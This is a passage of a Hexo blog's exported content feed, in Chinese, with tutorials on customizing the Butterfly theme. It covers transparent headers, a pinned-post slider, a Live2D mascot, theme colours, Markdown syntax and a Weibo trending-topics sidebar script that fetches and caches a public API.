<p>通过开启butterfly主题留下的inject模块功能</p>
<h4 id="添加css代码">添加css代码</h4>
<p>先在主题的css文件夹中创建custom.css文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>编辑让顶部背景和页脚背景透明的css文件<br>
vim custom.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="config-yml中开启inject部分功能">_config.yml中开启inject部分功能</h4>
<p>将head部分注释取消<br>
<img src="/images/pasted-23.png" alt="upload successful"></p>
<h4 id="更换背景">更换背景</h4>
<p>vim搜索背景，更换background</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<h3 id="效果实现">效果实现</h3>
<h4 id="启动hexo查看效果">启动hexo查看效果</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>刷新页面<br>
<img src="/images/pasted-22.png" alt="upload successful"></p>
<hr>
<h2 id="文章封面">文章封面</h2>
<h3 id="封面">封面</h3>
<p>修改部分为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>
<h3 id="分页">分页</h3>
<p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
<hr>
<h2 id="置顶文章滚动页">置顶文章滚动页</h2>
<h3 id="NPM-插件安装">NPM 插件安装</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>
<h3 id="新增网站根目录-config-配置项-不是主题的">新增网站根目录_config 配置项 (不是主题的)</h3>
<p>添加以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>相关含义小冰老师解释的很详细<br>
<a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
</blockquote>
<h3 id="最后在文章中加入以下内容">最后在文章中加入以下内容</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
<p>最后一行可不写，默认使用文章封面</p>
<hr>
<h2 id="看板娘">看板娘</h2>
<h3 id="添加代码">添加代码</h3>
<ol>
<li>打开主题配置文件<code>\hexo\themes\butterfly\_config.yml</code>，<code>inject</code>部分添加代码：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    - |</span><br><span class="line">      &lt;script src=&quot;https://cdn.jsdelivr.net/npm/live2d-widget@latest/lib/L2Dwidget.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        L2Dwidget.init(&#123;</span><br><span class="line">          model: &#123;</span><br><span class="line">            jsonPath: &#x27;https://raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/HK416-2/normal/model.json&#x27;</span><br><span class="line">          &#125;,</span><br><span class="line">          display: &#123; position: &#x27;right&#x27;, width: 250, height: 320 &#125;,</span><br><span class="line">          mobile: &#123; show: false &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<pre><code>* 上面使用的是`HK416-2-normal`，修改model的jsonpath即可修改看板娘
</code></pre>
<ol start="2">
<li>看板娘开源项目<a href="https://github.com/iCharlesZ/vscode-live2d-models">GitHub 大合集</a></li>
</ol>
<h3 id="模型json">模型json</h3>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># <span class="number">22</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/bilibili-22/index.json</span></span><br><span class="line"></span><br><span class="line"># <span class="number">33</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/bilibili-33/index.json</span></span><br><span class="line"></span><br><span class="line"># HK416<span class="number">-2</span>-normal</span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/HK416-2/normal/model.json</span></span><br><span class="line"></span><br><span class="line"># HK416<span class="number">-2</span>-destroy</span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/HK416-2/destroy/model.json</span></span><br><span class="line"></span><br><span class="line"># UMP45<span class="number">-3</span>-destroy</span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/UMP45-3/destroy/model.json</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="主题色">主题色</h2>
<p>修改以下内容即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-书写</title>
    <url>/2025/02/08/hexo-%E4%B9%A6%E5%86%99/</url>
    <content><![CDATA[<h2 id="常用书写">常用书写</h2>
<h3 id="代码">代码</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\```bash</span><br><span class="line"></span><br><span class="line">\```</span><br></pre></td></tr></table></figure>
<h3 id="引用">引用</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">一级</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">二级</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>演示</p>
</blockquote>
<h3 id="列表">列表</h3>
<h4 id="无序列表">无序列表</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* 1</span><br><span class="line">* 2</span><br><span class="line">* 3</span><br></pre></td></tr></table></figure>
<ul>
<li>演示</li>
</ul>
<h4 id="有序列表">有序列表</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. </span><br><span class="line">2. </span><br><span class="line">3. </span><br></pre></td></tr></table></figure>
<ol>
<li>演示</li>
<li>ha</li>
<li>ha</li>
</ol>
<h3 id="特殊字效果">特殊字效果</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;u&gt;下划线演示&lt;/u&gt;</span><br><span class="line"></span><br><span class="line">文字**加粗**演示</span><br><span class="line"></span><br><span class="line">文字*斜体*演示</span><br><span class="line"></span><br><span class="line">文本`高亮`演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br></pre></td></tr></table></figure>
<p><u>下划线演示</u><br>
文字<strong>加粗</strong>演示<br>
文字<em>斜体</em>演示<br>
文本<code>高亮</code>演示<br>
文本<s>删除</s>线演示</p>
<h3 id="note">note</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;</span><br><span class="line">卡</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-bullhorn&#x27; modern %&#125;</span><br><span class="line">通知</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;</span><br><span class="line">车</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>卡</p>
</div>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>通知</p>
</div>
<div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>车</p>
</div>
<h3 id="插入文章链接">插入文章链接</h3>
<p>插入本文文章的链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hexo-书写](/2025/02/08/hexo-书写/)</span><br></pre></td></tr></table></figure>
<p><a href="/2025/02/08/hexo-%E4%B9%A6%E5%86%99/">演示</a>，还是回到本文</p>
<h2 id="标签外挂">标签外挂</h2>
<h3 id="Gallery-相册图库">Gallery 相册图库</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;gallery-group-main&quot;&gt;</span><br><span class="line">&#123;% galleryGroup &#x27;壁纸&#x27; &#x27;收藏的一些壁纸&#x27; &#x27;壁纸/index.html&#x27; https://api.aqcoder.cn/today %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>示例</p>
</blockquote>
<div class="gallery-group-main">
<figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='https://i.postimg.cc/3RcrjP4F/image.jpg' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">壁纸</div>
  <p>收藏的一些壁纸</p>
  <a href='/%E5%A3%81%E7%BA%B8/index.html'></a>
  </figcaption>
  </figure>
  
</div>
<h3 id="Gallery-相册">Gallery 相册</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](https://i.postimg.cc/nL8wr5jT/image.jpg)</span><br><span class="line">![](https://i.postimg.cc/3RcrjP4F/image.jpg)</span><br><span class="line">![](https://i.postimg.cc/Nfq41Tff/image.png)</span><br><span class="line">![](https://i.postimg.cc/y8ny4bhk/image.png)</span><br><span class="line">![](https://i.postimg.cc/Gp2Jcxzz/wallhaven-x6vx93.jpg)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure>
<div class="gallery-container" data-type="data" data-button="">
      <div class="gallery-data">[{"url":"https://i.postimg.cc/nL8wr5jT/image.jpg","alt":""},{"url":"https://i.postimg.cc/3RcrjP4F/image.jpg","alt":""},{"url":"https://i.postimg.cc/Nfq41Tff/image.png","alt":""},{"url":"https://i.postimg.cc/y8ny4bhk/image.png","alt":""},{"url":"https://i.postimg.cc/Gp2Jcxzz/wallhaven-x6vx93.jpg","alt":""}]</div>
      <div class="gallery-items">
      </div>
    </div>]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-微博热搜侧边栏</title>
    <url>/2025/02/20/hexo-%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E4%BE%A7%E8%BE%B9%E6%A0%8F/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>学习来自<code>Ldyer</code>，原文链接：</p>
<blockquote>
<p><a href="https://blog.ldyer.top/2024/04/24/%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E6%9D%BF%E5%9D%97/index.html">https://blog.ldyer.top/2024/04/24/微博热搜板块/index.html</a></p>
</blockquote>
<p>有部分有问题的做了修改，也有部分不太符合主题的做了颜色修改。</p>
<h2 id="效果图">效果图</h2>
<p><img src="/images/pasted-85.png" alt="效果"></p>
<h2 id="配置方法">配置方法</h2>
<h3 id="创建widget-yml文件">创建widget.yml文件</h3>
<p>如果没有这个目录需要创建，<code>source/_data/widget.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里填top表示所有地方都显示，bottom表示只在非文章页面显示，如主页等等</span></span><br><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">class_name:</span></span><br><span class="line">    <span class="attr">id_name:</span> <span class="string">weibo</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">微博热搜</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fa-brands</span> <span class="string">fa-weibo</span></span><br><span class="line">    <span class="attr">html:</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/weibo.css&quot;&gt;&lt;div</span> <span class="string">id=&quot;weiboContent&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建weibo-css">创建weibo.css</h3>
<p>创建<code>themes/butterfly/source/css/weibo.css</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 设置从左到右的渐变背景色 */</span></span><br><span class="line"><span class="selector-id">#weibo</span><span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#4B0082</span>, <span class="number">#000000</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*热度标签背景颜色*/</span></span><br><span class="line"><span class="selector-class">.weibo-new</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff3852</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-hot</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff9406</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-jyzy</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ffc000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-recommend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#00b7ee</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-adrecommend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#febd22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-friend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#8fc21e</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-boom</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#bd0000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-topic</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff6f49</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-topic-ad</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#4dadff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-boil</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f86400</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo</span> <span class="selector-class">.item-content</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo-container</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">250px</span>; <span class="comment">/* 容器高度固定为250px */</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">95%</span>;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">    -ms-<span class="attribute">overflow</span>-style: none;</span><br><span class="line">    <span class="attribute">scrollbar-width</span>: none</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-list-item</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-title</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: auto; <span class="comment">/* 最大宽度 */</span></span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">margin-right</span>: auto</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-num</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-hotness</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">8</span>) <span class="built_in">translateX</span>(-<span class="number">3px</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo-container</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>; <span class="comment">/* 链接文字颜色 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> <span class="selector-id">#weibo-container</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 隐藏滚动条 */</span></span><br><span class="line"><span class="selector-id">#weibo-container</span>::-webkit-scrollbar&#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="创建weibo-js文件">创建weibo.js文件</h3>
<p>创建<code>themes/butterfly/source/js/weibo.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果你开启了在手机端显示侧边栏，可以将下面这行代码注释，开启下面的weibo();</span></span><br><span class="line"><span class="keyword">try</span> &#123; <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;weibo&#x27;</span>).<span class="property">clientWidth</span>) <span class="title function_">weibo</span>(); &#125; <span class="keyword">catch</span> (error) &#123;&#125;</span><br><span class="line"><span class="comment">// weibo();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">weibo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> hotness = &#123;</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;weibo-boom&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;weibo-hot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;weibo-boil&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;weibo-new&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;weibo-recommend&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> html = <span class="string">&#x27;&lt;div id=&quot;weibo-container&quot;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;weibo&#x27;</span>));</span><br><span class="line">    <span class="keyword">let</span> nowTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">let</span> ls;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span> || nowTime - data.<span class="property">time</span> &gt; <span class="number">600000</span>) &#123; <span class="comment">// 600000为缓存时间，即10分钟，避免频繁请求，加快本地访问速度。</span></span><br><span class="line">        <span class="title function_">getData</span>();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ls = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data.<span class="property">ls</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> ls) &#123;</span><br><span class="line">        html += <span class="string">&#x27;&lt;div class=&quot;weibo-list-item&quot;&gt;&lt;div class=&quot;weibo-hotness &#x27;</span> + hotness[item.<span class="property">index</span>] + <span class="string">&#x27;&quot;&gt;&#x27;</span> + item.<span class="property">index</span> + <span class="string">&#x27;&lt;/div&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;span class=&quot;weibo-title&quot;&gt;&lt;a title=&quot;&#x27;</span> + item.<span class="property">title</span> + <span class="string">&#x27;&quot; href=&quot;&#x27;</span> + item.<span class="property">url</span> + <span class="string">&#x27;&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noreferrer&quot;&gt;&#x27;</span> + item.<span class="property">title</span> + <span class="string">&#x27;&lt;/a&gt;&lt;/span&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;div class=&quot;weibo-num&quot;&gt;&lt;span&gt;&#x27;</span> + item.<span class="property">hot</span> + <span class="string">&#x27;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    html += <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;weiboContent&#x27;</span>).<span class="property">innerHTML</span> = html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 这里采用新的api，如果炸了，可以换其他的，但注意api接收的json样式</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://v2.api-m.com/api/weibohot&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> data.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            data = &#123; <span class="attr">time</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(), <span class="attr">ls</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data.<span class="property">data</span>) &#125;</span><br><span class="line">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;weibo&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取数据失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">then</span>(weibo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bber-talk&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> swiper = <span class="keyword">new</span> <span class="title function_">swiper</span>(<span class="string">&#x27;.swiper-container&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">direction</span>: <span class="string">&#x27;vertical&#x27;</span>, </span><br><span class="line">      <span class="attr">loop</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">autoplay</span>: &#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">3000</span>,</span><br><span class="line">      <span class="attr">pauseOnMouseEnter</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="引入weibo-css与weibo-js">引入weibo.css与weibo.js</h3>
<p>和前面一图流方式一样，在<code>themes/butterfly/_config.yml</code>中添加</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/weibo.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="comment"># weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=&quot;/js/weibo.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="加入卡片">加入卡片</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line"><span class="string">..........</span></span><br><span class="line">    <span class="attr">card_webinfo:</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">post_count:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
